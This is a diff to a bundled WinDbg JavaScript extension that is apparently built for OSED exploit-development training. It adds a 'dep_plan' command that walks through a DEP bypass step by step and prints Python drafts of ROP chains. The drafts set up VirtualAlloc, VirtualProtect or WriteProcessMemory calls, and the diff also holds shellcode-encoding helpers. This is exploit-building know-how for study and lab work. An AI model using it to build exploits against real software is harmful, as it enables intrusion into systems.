     add_esp: "Scan for add esp, N gadgets",
@@ -13183,8 +13197,8 @@ var osed_bundle = (() => {
     return shellcode.map((b) => (b ^ key2) & 255);
   }
   function findXorKey(shellcode, exclude, hint) {
-    const candidates2 = hint !== void 0 ? [hint & 255] : Array.from({ length: 255 }, (_, i) => i + 1);
-    for (const key2 of candidates2) {
+    const candidates3 = hint !== void 0 ? [hint & 255] : Array.from({ length: 255 }, (_, i) => i + 1);
+    for (const key2 of candidates3) {
       if (key2 === 0 || exclude.has(key2))
         continue;
       if (xorEncode(shellcode, key2).every((b) => !exclude.has(b)))
@@ -13337,6 +13351,46 @@ var osed_bundle = (() => {
   }
 
   // src/commands/rop_template.ts
+  var PUSHAD_MAPS = {
+    VirtualAlloc: [
+      "    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)",
+      "    [ESP+4]  = ESI        <- VirtualAlloc address (read from the IAT slot)",
+      "    [ESP+8]  = EBP        <- return address of VirtualAlloc: jmp esp / call esp",
+      "    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free",
+      "    [ESP+16] = EBX        <- dwSize = 0x1",
+      "    [ESP+20] = EDX        <- flAllocationType = 0x1000",
+      "    [ESP+24] = ECX        <- flProtect = 0x40",
+      "    [ESP+28] = EAX        <- 0x90909090, the start of the NOP sled"
+    ],
+    VirtualProtect: [
+      "    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)",
+      "    [ESP+4]  = ESI        <- VirtualProtect address (read from the IAT slot)",
+      "    [ESP+8]  = EBP        <- return address of VirtualProtect: jmp esp / call esp",
+      "    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free",
+      "    [ESP+16] = EBX        <- dwSize = 0x201",
+      "    [ESP+20] = EDX        <- flNewProtect = 0x40",
+      "    [ESP+24] = ECX        <- lpflOldProtect = a writable address",
+      "    [ESP+28] = EAX        <- 0x90909090, jmp esp runs it, then the shellcode"
+    ],
+    WriteProcessMemory: [
+      "    [ESP+0]  = EDI        <- add esp, 0xC ; ret (skips the next three dwords)",
+      "    [ESP+4]  = ESI        <- skipped",
+      "    [ESP+8]  = EBP        <- skipped",
+      "    [ESP+12] = saved ESP  <- skipped",
+      "    [ESP+16] = EBX        <- WriteProcessMemory address (read from the IAT slot)",
+      "    [ESP+20] = EDX        <- return address = CAVE",
+      "    [ESP+24] = ECX        <- hProcess = 0xFFFFFFFF",
+      "    [ESP+28] = EAX        <- lpBaseAddress = CAVE",
+      "    [ESP+32]  payload     <- lpBuffer = shellcode address, patched by one write",
+      "    [ESP+36]  payload     <- nSize, patched if it holds bad bytes",
+      "    [ESP+40]  payload     <- lpNumberOfBytesWritten = WRITABLE"
+    ]
+  };
+  function printPushadMap(api) {
+    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
+    for (const line of PUSHAD_MAPS[api])
+      print(line);
+  }
   function fieldTable(fields) {
     print(`  ${"Field".padEnd(24)}${"Real value".padEnd(30)}How to get it`);
     for (const field of fields)
@@ -13438,15 +13492,7 @@ var osed_bundle = (() => {
     print('  Clean constants:       dx @$osed().rop.construct("ecx", 0x40, "<bad chars>")');
     print('  Load order:            dx @$osed().rop.setup("ebx=0x1 edx=0x1000 ecx=0x40", "<bad chars>")');
     section("Step 2 \u2014 PUSHAD register map");
-    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
-    print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
-    print("    [ESP+4]  = ESI        <- VirtualAlloc address (read from the IAT slot)");
-    print("    [ESP+8]  = EBP        <- return address of VirtualAlloc: jmp esp / call esp");
-    print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
-    print("    [ESP+16] = EBX        <- dwSize = 0x1");
-    print("    [ESP+20] = EDX        <- flAllocationType = 0x1000");
-    print("    [ESP+24] = ECX        <- flProtect = 0x40");
-    print("    [ESP+28] = EAX        <- 0x90909090, the start of the NOP sled");
+    printPushadMap("VirtualAlloc");
     section("Step 3 \u2014 Python skeleton");
     print("import struct");
     print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
@@ -13543,15 +13589,7 @@ var osed_bundle = (() => {
     print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
     print('  Load order:            dx @$osed().rop.setup("ebx=0x201 edx=0x40", "<bad chars>")');
     section("Step 2 \u2014 PUSHAD register map");
-    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
-    print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
-    print("    [ESP+4]  = ESI        <- VirtualProtect address (read from the IAT slot)");
-    print("    [ESP+8]  = EBP        <- return address of VirtualProtect: jmp esp / call esp");
-    print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
-    print("    [ESP+16] = EBX        <- dwSize = 0x201");
-    print("    [ESP+20] = EDX        <- flNewProtect = 0x40");
-    print("    [ESP+24] = ECX        <- lpflOldProtect = a writable address");
-    print("    [ESP+28] = EAX        <- 0x90909090, jmp esp runs it, then the shellcode");
+    printPushadMap("VirtualProtect");
     section("Step 3 \u2014 Python skeleton");
     print("import struct");
     print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
@@ -13662,18 +13700,7 @@ var osed_bundle = (() => {
     print(`  Code cave:             dx @$osed().code_caves("${mod}", 0x200, 25, "<bad chars>", "EXEC")`);
     print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
     section("Step 2 \u2014 PUSHAD register map");
-    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
-    print("    [ESP+0]  = EDI        <- add esp, 0xC ; ret (skips the next three dwords)");
-    print("    [ESP+4]  = ESI        <- skipped");
-    print("    [ESP+8]  = EBP        <- skipped");
-    print("    [ESP+12] = saved ESP  <- skipped");
-    print("    [ESP+16] = EBX        <- WriteProcessMemory address (read from the IAT slot)");
-    print("    [ESP+20] = EDX        <- return address = CAVE");
-    print("    [ESP+24] = ECX        <- hProcess = 0xFFFFFFFF");
-    print("    [ESP+28] = EAX        <- lpBaseAddress = CAVE");
-    print("    [ESP+32]  payload     <- lpBuffer = shellcode address, patched by one write");
-    print("    [ESP+36]  payload     <- nSize, patched if it holds bad bytes");
-    print("    [ESP+40]  payload     <- lpNumberOfBytesWritten = WRITABLE");
+    printPushadMap("WriteProcessMemory");
     section("Step 3 \u2014 Python skeleton");
     print("import struct");
     print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
@@ -13888,6 +13915,227 @@ var osed_bundle = (() => {
         };
       }
     };
+  }
+
+  // src/commands/dep_plan.ts
+  var DEP_PLAN_APIS = ["VirtualAlloc", "VirtualProtect", "WriteProcessMemory"];
+  var DEP_PLAN_STYLES = ["skeleton", "pushad"];
+  var DEP_PLAN_SECTIONS = 7;
+  var CONSTANTS = {
+    VirtualAlloc: [
+      { field: "dwSize", value: 1 },
+      { field: "flAllocationType", value: 4096 },
+      { field: "flProtect", value: 64 }
+    ],
+    VirtualProtect: [
+      { field: "dwSize", value: 513 },
+      { field: "flNewProtect", value: 64 }
+    ],
+    WriteProcessMemory: [
+      { field: "hProcess", value: 4294967295 },
+      { field: "nSize", value: 528 }
+    ]
+  };
+  var SKELETON_JOBS = [
+    { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"] },
+    { key: "copy", title: "copy a register", capabilities: ["MOVE_REGISTER", "EXCHANGE_REGISTER"] },
+    { key: "add", title: "add or subtract", capabilities: ["REGISTER_ADD", "REGISTER_SUB"] },
+    { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"] },
+    { key: "read", title: "read a pointer", capabilities: ["MEMORY_READ"] },
+    { key: "write", title: "write a field", capabilities: ["MEMORY_WRITE"] },
+    { key: "advance", title: "advance the pointer (inc reg)", capabilities: ["REGISTER_INCREMENT"] },
+    { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"] }
+  ];
+  var PUSHAD_REGISTERS = ["edi", "esi", "ebp", "ebx", "edx", "ecx", "eax"];
+  var PUSHAD_JOBS = [
+    ...PUSHAD_REGISTERS.map((register2) => ({ key: `pop_${register2}`, title: `pop ${register2}`, capabilities: ["LOAD_REGISTER"], register: register2 })),
+    { key: "read", title: "read a pointer (the IAT slot)", capabilities: ["MEMORY_READ"] },
+    { key: "pushad", title: "pushad ; ret", capabilities: ["DISPATCH_PUSHAD"] }
+  ];
+  function jobsFor(style) {
+    return style === "pushad" ? PUSHAD_JOBS : SKELETON_JOBS;
+  }
+  function movesEsp(gadget) {
+    return gadget.categories.includes("STACK_PIVOT") || gadget.capabilities.some((capability2) => capability2.kind === "STACK_PIVOT");
+  }
+  function jobCapability(gadget, job) {
+    return gadget.capabilities.find((capability2) => job.capabilities.includes(capability2.kind) && (job.register === void 0 || capability2.register === job.register));
+  }
+  function candidates2(index, job, count = 3) {
+    const matching = index.gadgets.filter((gadget) => jobCapability(gadget, job) !== void 0 && (job.key === "pivot" || !movesEsp(gadget)));
+    return rankCandidates(matching).slice(0, count);
+  }
+  function gadgetAddress(gadget) {
+    var _a2, _b;
+    return (_b = (_a2 = gadget.locations.find((location) => location.virtualAddress !== void 0)) == null ? void 0 : _a2.virtualAddress) != null ? _b : 0;
+  }
+  function hex325(value) {
+    return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+  function sequence(gadget) {
+    return gadget.instructions.map((instruction) => instruction.normalizedText).join(" ; ");
+  }
+  function sideEffects(gadget, job) {
+    var _a2;
+    const summary = gadget.semanticSummary.summary;
+    const written = [...summary.writes.values.exact, ...summary.writes.values.conservative].map(String).filter((register2) => !["esp", "eip"].includes(register2));
+    const deltas = [...summary.stackDelta.values.exact];
+    const stack = deltas.length === 1 ? `esp +0x${deltas[0].toString(16)}` : "esp ?";
+    const intended = (_a2 = jobCapability(gadget, job)) == null ? void 0 : _a2.register;
+    const pops = gadget.instructions.filter((instruction) => {
+      var _a3;
+      return instruction.mnemonic === "pop" && ((_a3 = instruction.operands[0]) == null ? void 0 : _a3.trim().toLowerCase()) !== intended;
+    }).length;
+    const last = gadget.instructions[gadget.instructions.length - 1];
+    const retN = (last == null ? void 0 : last.mnemonic) === "ret" && last.operands.length === 1 ? `ret ${last.operands[0]}` : "";
+    const memory = job.key !== "write" && gadget.instructions.some((instruction) => {
+      var _a3;
+      return instruction.mnemonic !== "push" && ((_a3 = instruction.operands[0]) != null ? _a3 : "").includes("[");
+    }) ? "writes memory" : "";
+    return [
+      `writes ${written.length > 0 ? [...new Set(written)].join(" ") : "nothing"}`,
+      stack,
+      pops > 0 ? `${pops} extra pop${pops > 1 ? "s" : ""}` : "",
+      retN,
+      memory
+    ].filter(Boolean).join(", ");
+  }
+  function candidateLines(gadgets, job) {
+    if (gadgets.length === 0)
+      return [`  ${job.title}: none in the corpus`];
+    return [
+      `  ${job.title}:`,
+      ...gadgets.map((gadget) => `    ${hex325(gadgetAddress(gadget))}  ${sequence(gadget).padEnd(40)}  ${sideEffects(gadget, job)}`)
+    ];
+  }
+  function slotLine(name, value, how) {
+    return value === void 0 ? `${name.padEnd(9)}= 0x????????   # TODO ${how}` : `${name.padEnd(9)}= ${hex325(value)}   # ${how}`;
+  }
+  function gadgetLine(best, key2, title) {
+    const gadget = best[key2];
+    return gadget ? `rop += p32(${hex325(gadgetAddress(gadget))})    # ${title}: ${sequence(gadget)}` : `rop += p32(0x????????)    # TODO ${title}: no candidate in the corpus`;
+  }
+  var FRAME_DWORDS = { VirtualAlloc: 6, VirtualProtect: 6, WriteProcessMemory: 7 };
+  function measureLines(input) {
+    const capture = input.best.capture;
+    const at = capture ? hex325(gadgetAddress(capture)) : "<capture gadget>";
+    return [
+      "# TODO measure: distance from the captured ESP to field 1 of the frame",
+      `#   bp ${at} ; g ; r esp                      ESP here is the value push esp stores`,
+      "#   s -d esp-400 L100 45454545                    address of field 1 (the first dummy)",
+      "#   ? <field 1> - <captured ESP>                  negative: pop it into a register, then add",
+      "DIST_FIELD1 = ???",
+      "# TODO measure: distance from the captured ESP to the shellcode",
+      "#   s -b esp L2000 90 90 90 90                    start of the NOP sled",
+      "#   ? <sled> - <captured ESP>",
+      "DIST_SHELLCODE = ???"
+    ];
+  }
+  function skeletonFrame(api) {
+    if (api === "VirtualAlloc") {
+      return [
+        "frame  = p32(0x45454545)   # VirtualAlloc address   <- [IAT_SLOT]",
+        "frame += p32(0x46464646)   # return address         <- shellcode",
+        "frame += p32(0x47474747)   # lpAddress              <- shellcode",
+        "frame += p32(0x48484848)   # dwSize                 <- 0x1",
+        "frame += p32(0x49494949)   # flAllocationType       <- 0x1000",
+        "frame += p32(0x51515151)   # flProtect              <- 0x40"
+      ];
+    }
+    if (api === "VirtualProtect") {
+      return [
+        "frame  = p32(0x45454545)   # VirtualProtect address <- [IAT_SLOT]",
+        "frame += p32(0x46464646)   # return address         <- shellcode",
+        "frame += p32(0x47474747)   # lpAddress              <- shellcode",
+        "frame += p32(0x48484848)   # dwSize                 <- 0x201",
+        "frame += p32(0x49494949)   # flNewProtect           <- 0x40",
+        "frame += p32(WRITABLE)     # lpflOldProtect         literal when clean"
+      ];
+    }
+    return [
+      "frame  = p32(0x45454545)   # WriteProcessMemory     <- [IAT_SLOT]",
+      "frame += p32(CAVE)         # return address         literal when clean",
+      "frame += p32(0xFFFFFFFF)   # hProcess               literal",
+      "frame += p32(CAVE)         # lpBaseAddress          literal when clean",
+      "frame += p32(0x46464646)   # lpBuffer               <- shellcode",
+      "frame += p32(0x47474747)   # nSize                  <- 0x210",
+      "frame += p32(WRITABLE)     # lpNumberOfBytesWritten literal when clean"
+    ];
+  }
+  function skeletonChain(input) {
+    const { best } = input;
+    const patched = input.api === "WriteProcessMemory" ? "fields 1, 5 and 6" : input.api === "VirtualProtect" ? "fields 1 to 5" : "fields 1 to 6";
+    return [
+      'rop  = b""',
+      gadgetLine(best, "capture", "capture ESP"),
+      gadgetLine(best, "copy", "keep it in a working register"),
+      "# working pointer -> field 1: load DIST_FIELD1 with a pop, then",
+      gadgetLine(best, "add", "add the distance"),
+      "# field 1: the API address",
+      "rop += p32(0x????????)    # TODO pop <reg> ; ret, followed by p32(IAT_SLOT) or its rop.construct recipe from [5/7]",
+      gadgetLine(best, "read", "read the API address from the slot"),
+      gadgetLine(best, "write", "write it into the field"),
+      gadgetLine(best, "advance", "advance to the next field, four times").replace(")    #", ") * 4  #"),
+      `# repeat load / write / advance for ${patched}, with the recipes from [5/7]`,
+      "# and the shellcode address = captured ESP + DIST_SHELLCODE",
+      "# move the working pointer back to field 1, then",
+      gadgetLine(best, "pivot", "pivot ESP onto field 1")
+    ];
+  }
+  function pushadChain(input) {
+    const { best } = input;
+    const lines = [
+      'rop  = b""',
+      "# ESI = the API address: read the slot, then move it to ESI",
+      gadgetLine(best, "pop_eax", "pop eax"),
+      "rop += p32(IAT_SLOT)",
+      gadgetLine(best, "read", "read the slot"),
+      'rop += p32(0x????????)    # TODO mov esi, eax / xchg eax, esi (rop.query("capability", "MOVE_REGISTER"))',
+      "# the other registers, in an order where no later gadget overwrites an earlier register:",
+      '#   dx @$osed().rop.setup("ebp=<jmp esp> ebx=... edx=... ecx=... edi=<ret> eax=0x90909090", "<bad chars>")'
+    ];
+    for (const register2 of ["ebp", "ebx", "edx", "ecx", "edi", "eax"]) {
+      lines.push(gadgetLine(best, `pop_${register2}`, `pop ${register2}`), `rop += p32(0x????????)    # TODO value for ${register2.toUpperCase()}, see the map in [6/7]`);
+    }
+    lines.push(gadgetLine(best, "pushad", "pushad ; ret"));
+    if (input.jmpEsp !== void 0)
+      lines.push(`# jmp esp for EBP: ${hex325(input.jmpEsp)}`);
+    return lines;
+  }
+  function draftLines(input) {
+    const head = [
+      "# DRAFT. Verify every field in WinDbg before you trust it. This is not a finished chain:",
+      "# the gadgets below are the top-ranked candidate per job, and nothing checked that the",
+      "# register one gadget leaves is the register the next one reads.",
+      "import struct",
+      "def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)",
+      "",
+      "OFFSET   = ???              # TODO measure: bytes from buffer start to EIP (pattern.create / pattern.offset)",
+      slotLine("IAT_SLOT", input.iatSlot, `IAT slot of ${input.api}`)
+    ];
+    if (input.api !== "VirtualAlloc")
+      head.push(slotLine("WRITABLE", input.writable, "writable dword, from [5/7]"));
+    if (input.api === "WriteProcessMemory")
+      head.push(slotLine("CAVE", input.cave, "executable code cave, from [5/7]"));
+    head.push("");
+    if (input.style === "pushad") {
+      return [...head, ...pushadChain(input), "", 'shellcode = b"\\x90" * 16 + b"..."', 'payload = b"A" * OFFSET + rop + shellcode'];
+    }
+    const frameBytes = FRAME_DWORDS[input.api] * 4;
+    return [
+      ...head,
+      ...measureLines(input),
+      "",
+      `# frame, ${FRAME_DWORDS[input.api]} dwords just before EIP (bp <first gadget> ; dd esp-${(frameBytes + 4).toString(16)} L${FRAME_DWORDS[input.api]})`,
+      ...skeletonFrame(input.api),
+      "",
+      ...skeletonChain(input),
+      "",
+      'shellcode = b"\\x90" * 16 + b"..."',
+      'payload  = b"A" * (OFFSET - len(frame)) + frame + rop',
+      'payload += b"C" * ???        # TODO measure: padding so the shellcode sits at captured ESP + DIST_SHELLCODE',
+      "payload += shellcode"
+    ];
   }
 
   // src/commands/dep_function.ts
@@ -15145,11 +15393,11 @@ var osed_bundle = (() => {
         return { kind: "not_found", name };
       }
       const bestScore = Math.min(...scored.map((entry) => entry.score));
-      const candidates2 = scored.filter((entry) => entry.score === bestScore).map((entry) => entry.module).sort((a, b) => a.base < b.base ? -1 : 1);
-      if (candidates2.length === 1) {
-        return { kind: "ok", module: candidates2[0] };
+      const candidates3 = scored.filter((entry) => entry.score === bestScore).map((entry) => entry.module).sort((a, b) => a.base < b.base ? -1 : 1);
+      if (candidates3.length === 1) {
+        return { kind: "ok", module: candidates3[0] };
       }
-      return { kind: "ambiguous", candidates: candidates2 };
+      return { kind: "ambiguous", candidates: candidates3 };
     }
     findMainModule() {
       var _a2, _b, _c, _d, _e, _f;
@@ -15239,8 +15487,8 @@ var osed_bundle = (() => {
     isExecutableProtect(protect) {
       return (protect & 255) === 16 || (protect & 255) === 32 || (protect & 255) === 64 || (protect & 255) === 128;
     }
-    moduleCandidatesRows(candidates2) {
-      return candidates2.map((module) => ({
+    moduleCandidatesRows(candidates3) {
+      return candidates3.map((module) => ({
         Base: toDmlAddress(module.base, "db"),
         End: toDmlAddress(module.end, "db"),
         Name: module.name,
@@ -16444,7 +16692,7 @@ if __name__ == "__main__":
   var regIndex = (reg) => REGS2.indexOf(reg);
   var isReg = (value) => REGS2.includes(value);
   var hex4 = (value) => `0x${(value >>> 0).toString(16)}`;
-  var hex325 = (value) => `0x${(value >>> 0).toString(16).padStart(8, "0")}`;
+  var hex326 = (value) => `0x${(value >>> 0).toString(16).padStart(8, "0")}`;
   var fitsImm8 = (value) => (value | 0) >= -128 && (value | 0) <= 127;
   function le32(value) {
     const v = value >>> 0;
@@ -16546,7 +16794,7 @@ if __name__ == "__main__":
       const value = (chunk[0] | chunk[1] << 8 | chunk[2] << 16 | chunk[3] << 24) >>> 0;
       const plan = pushValue(value, bad);
       if (!plan)
-        return { ok: false, error: `No encoding of dword ${hex325(value)} (${describeBytes(chunk)}) avoids the bad characters.` };
+        return { ok: false, error: `No encoding of dword ${hex326(value)} (${describeBytes(chunk)}) avoids the bad characters.` };
       lines.push(...withNote(plan, describeBytes(chunk)));
     }
     if (register2) {
@@ -16639,8 +16887,8 @@ if __name__ == "__main__":
     const hash = ror13Hash(name);
     const hashPlan = pushValue(hash, bad, scratch);
     if (!hashPlan)
-      return { ok: false, error: `No encoding of hash ${hex325(hash)} avoids the bad characters.` };
-    lines.push(...withNote(hashPlan, `ROR13("${name}") = ${hex325(hash)}`));
+      return { ok: false, error: `No encoding of hash ${hex326(hash)} avoids the bad characters.` };
+    lines.push(...withNote(hashPlan, `ROR13("${name}") = ${hex326(hash)}`));
     const kernel32 = module === "kernel32.dll";
     lines.push(__spreadProps(__spreadValues({}, x86.pushFrame(kernel32 ? SLOT.kernel32 : SLOT.module)), { note: kernel32 ? "kernel32 base" : `${module} base saved after LoadLibraryA` }), __spreadProps(__spreadValues({}, x86.callFrame(SLOT.resolver)), { note: `resolver: eax = ${name}` }), __spreadProps(__spreadValues({}, x86.callReg("eax")), { note: `${name} pops its ${args.length} argument(s)` }));
     for (const line of lines) {
@@ -16649,7 +16897,7 @@ if __name__ == "__main__":
         warnings.push(`"${line.asm}" holds bad byte(s) ${hexBytes(hits)}; rewrite that line by hand.`);
     }
     const params = prototype ? prototype.params.join(", ") : args.map((_, i) => `arg${i + 1}`).join(", ");
-    return { ok: true, api: name, module, hash, known: !!prototype, title: `${name}(${params}) in ${module}, ROR13 ${hex325(hash)}`, lines, warnings };
+    return { ok: true, api: name, module, hash, known: !!prototype, title: `${name}(${params}) in ${module}, ROR13 ${hex326(hash)}`, lines, warnings };
   }
   function parseBadchars(value) {
     if (value === void 0 || value === null || value === "")
@@ -17373,11 +17621,20 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
   }
   function enrichAndSplit(caves, minSize) {
     const result3 = [];
+    const regions = [];
+    const regionAt = (address) => {
+      const known = regions.find((region) => region.baseAddress !== void 0 && region.regionSize !== void 0 && region.baseAddress <= address && address < region.baseAddress + region.regionSize);
+      if (known)
+        return known;
+      const fresh = memoryRegion(address);
+      regions.push(fresh);
+      return fresh;
+    };
     for (const cave of caves) {
       let pos = cave.address;
       const end = cave.address + __bi(cave.size);
       while (pos < end) {
-        const region = memoryRegion(pos);
+        const region = regionAt(pos);
         let segEnd;
         if (region.baseAddress !== void 0 && region.regionSize !== void 0 && region.regionSize > __bi(0) && region.baseAddress <= pos && region.baseAddress + region.regionSize > pos) {
           segEnd = region.baseAddress + region.regionSize;
@@ -18576,6 +18833,22 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
       output: "A commented Python skeleton with one line per stack word.",
       report: "Prepared the <method> call frame skeleton with dep_function and replaced each placeholder with target addresses.",
       quick: true
+    },
+    {
+      name: "dep_plan",
+      summary: "Whole DEP bypass discovery in seven sections",
+      what: "Runs the discovery for a <api> DEP bypass from <module> in one go, in the <style> style, and prints each step under its own [n/7] header.",
+      how: "Calls the existing commands in order: modules for <module>, sc.iat_find for <api>, rop.scan_live with <badchars>, a ranked rop.query per job with each gadget's side effects, rop.construct for each constant, code_caves for writable and executable addresses, then dep_function or the PUSHAD map, and last a Python draft. The draft fills in the top gadget per job and marks with TODO the distances only a debugger run can give, with the bp and dd commands that measure them. It does not check that the registers of one gadget feed the next.",
+      when: "Later labs and the exam, once you know the method by hand and want every piece on one screen. Verify the draft field by field before you trust it.",
+      args: [
+        { name: "api", meaning: "DEP bypass API.", values: { VirtualAlloc: "commits the stack page again as executable.", VirtualProtect: "makes the stack executable.", WriteProcessMemory: "copies the shellcode into a code cave." } },
+        { name: "module", meaning: "Module without ASLR that supplies the gadgets and the IAT slot." },
+        BADCHARS('Bytes the target corrupts or cuts, as one hex string such as "00 0A 0D". Every address and constant is checked against them.', "none"),
+        { name: "style", meaning: "How the chain builds the call frame.", optional: true, default: "skeleton", values: { skeleton: "dummy frame in the buffer, each field patched, then a pivot.", pushad: "registers loaded, then one PUSHAD writes the frame." } }
+      ],
+      example: 'dx @$osed().dep_plan("VirtualAlloc", "libbkup", "00 09 0A 0B 0C 0D 20")',
+      output: "Seven sections: [1/7] module protections, [2/7] IAT slot, [3/7] gadget corpus, [4/7] the best 3 gadgets per job with side effects, [5/7] clean recipes for the constants and the writable or cave addresses, [6/7] the frame or PUSHAD map, [7/7] a Python draft with TODO lines to measure.",
+      report: "Ran dep_plan for <api> from <module> with bad characters <badchars> in the <style> style, then verified each field of the draft in WinDbg before using it."
     },
     // Gadget corpus
     {
@@ -21406,8 +21679,8 @@ ${INDENT}`)]);
     return false;
   }
   function verifyCallSite(returnAddress, pointerSize) {
-    const candidates2 = pointerSize === 8 ? [7, 6, 5, 3, 2] : [5, 6, 3, 2];
-    for (const len of candidates2) {
+    const candidates3 = pointerSize === 8 ? [7, 6, 5, 3, 2] : [5, 6, 3, 2];
+    for (const len of candidates3) {
       const callAddr = returnAddress - __bi(len);
       const bytes = tryReadMemory(callAddr, len);
       if (bytes && isCallInstruction(bytes))
@@ -23398,7 +23671,7 @@ ${INDENT}`)]);
       const filterRegister = typeof options.register === "string" ? options.register.toLowerCase().trim() : void 0;
       const minDelta = typeof options.minDelta === "number" ? options.minDelta : void 0;
       const verbose = options.verbose === true;
-      const candidates2 = currentRopCorpus.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT" || c.kind === "STACK_ADJUST") && firstKnownAddress(g) !== void 0).sort((a, b) => {
+      const candidates3 = currentRopCorpus.gadgets.filter((g) => g.capabilities.some((c) => c.kind === "STACK_PIVOT" || c.kind === "STACK_ADJUST") && firstKnownAddress(g) !== void 0).sort((a, b) => {
         const aLen = a.instructions.length;
         const bLen = b.instructions.length;
         if (aLen !== bLen)
@@ -23406,7 +23679,7 @@ ${INDENT}`)]);
         return b.score - a.score;
       });
       const rows = [];
-      for (const gadget of candidates2) {
+      for (const gadget of candidates3) {
         const addr = firstKnownAddress(gadget);
         const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);
         const seq = gadgetSequence(gadget);
@@ -24373,7 +24646,7 @@ ${INDENT}`)]);
       if (isAutoApi) {
         section("API Auto-Selection");
         info("Evaluating DEP bypass candidates...");
-        const candidates2 = [];
+        const candidates3 = [];
         for (const apiName of DEP_BYPASS_APIS) {
           const slot = discoverIatSlot(apiName);
           const argCount = (_b = { VirtualProtect: 4, VirtualAlloc: 4, WriteProcessMemory: 5, VirtualProtectEx: 5, VirtualAllocEx: 5, WinExec: 2 }[apiName]) != null ? _b : 0;
@@ -24406,15 +24679,15 @@ ${INDENT}`)]);
             score -= 5;
             reasons.push("Ex variant (less common)");
           }
-          candidates2.push({ api: apiName, iatSlot: slot, slotClean, argCount, reason: reasons.join("; "), score });
+          candidates3.push({ api: apiName, iatSlot: slot, slotClean, argCount, reason: reasons.join("; "), score });
         }
-        candidates2.sort((a, b) => b.score - a.score);
-        for (const c of candidates2) {
+        candidates3.sort((a, b) => b.score - a.score);
+        for (const c of candidates3) {
           const status = c.iatSlot !== void 0 ? `${hex32(c.iatSlot)}${c.slotClean ? "" : " [BADCHAR]"}` : "not found";
-          const marker = c === candidates2[0] ? " \u2190 SELECTED" : "";
+          const marker = c === candidates3[0] ? " \u2190 SELECTED" : "";
           info(`  ${c.api.padEnd(20)} IAT: ${status.padEnd(24)} Score: ${String(c.score).padStart(3)}  (${c.reason})${marker}`);
         }
-        const best = candidates2[0];
+        const best = candidates3[0];
         if (best.iatSlot === void 0) {
           warn("No API found in IAT. The selected candidate will require a manual iatSlot override.");
         }
@@ -24860,6 +25133,165 @@ ${INDENT}`)]);
       });
       return toDxResult("Chain Verifier", rows);
     };
+    const executeDepPlan = (...args) => {
+      var _a2, _b, _c, _d, _e, _f;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("dep_plan");
+      }
+      const [apiArg, moduleArg, badArg, styleArg] = args;
+      const depApi = DEP_PLAN_APIS.find((name) => name.toLowerCase() === String(apiArg != null ? apiArg : "").trim().toLowerCase());
+      const style = String(styleArg != null ? styleArg : "skeleton").trim().toLowerCase();
+      const moduleName = typeof moduleArg === "string" ? moduleArg.trim() : "";
+      const badText = typeof badArg === "string" ? badArg : "";
+      const badchars = parseHexByteList(badText);
+      const fail3 = (message) => {
+        const rows = [{ Error: message }];
+        renderRows("DEP Plan", rows);
+        info("Usage: dx @$osed().dep_plan(api, module, badchars, style?)");
+        setResult({ command: "dep_plan", args: { api: apiArg, module: moduleArg, badchars: badArg, style: styleArg }, success: false, findings: [], warnings: [], errors: [message] });
+        return toDxResult("DEP Plan", rows);
+      };
+      if (!depApi)
+        return fail3(`api must be one of ${DEP_PLAN_APIS.join(", ")}.`);
+      if (!DEP_PLAN_STYLES.includes(style))
+        return fail3(`style must be one of ${DEP_PLAN_STYLES.join(", ")}.`);
+      if (!Array.isArray(badchars))
+        return fail3('badchars must be hex bytes such as "00 0A 0D".');
+      const moduleInfo = moduleName ? moduleInfoByName(moduleName) : void 0;
+      if (!moduleInfo)
+        return fail3(`Module "${moduleName}" is not loaded. dx @$osed().modules() lists the loaded modules.`);
+      const badSet = new Set(badchars);
+      const n = DEP_PLAN_SECTIONS;
+      const summary = [];
+      const shortName = (name) => {
+        var _a3;
+        return (_a3 = name.split("\\").pop()) != null ? _a3 : name;
+      };
+      const moduleLabel2 = shortName(moduleInfo.name);
+      const first = Number(moduleInfo.base);
+      const last = Number(moduleInfo.base + moduleInfo.size - __bi(1));
+      const fixedByte = (shift) => (first >>> shift & 255) === (last >>> shift & 255) ? first >>> shift & 255 : void 0;
+      section(`[1/${n}] Module protections for ${moduleLabel2}`);
+      invoke("modules", [moduleName]);
+      const sharedBad = [...new Set([24, 16].map(fixedByte).filter((byte) => byte !== void 0 && badSet.has(byte)))];
+      const moduleWarnings = [
+        moduleInfo.aslr === "enabled" ? `${moduleLabel2} has ASLR: its addresses change on every run, so a chain built from it needs a leak.` : void 0,
+        moduleInfo.preferredBase !== __bi(0) && moduleInfo.base !== moduleInfo.preferredBase ? `${moduleLabel2} was relocated from its preferred base ${hex325(Number(moduleInfo.preferredBase))}.` : void 0,
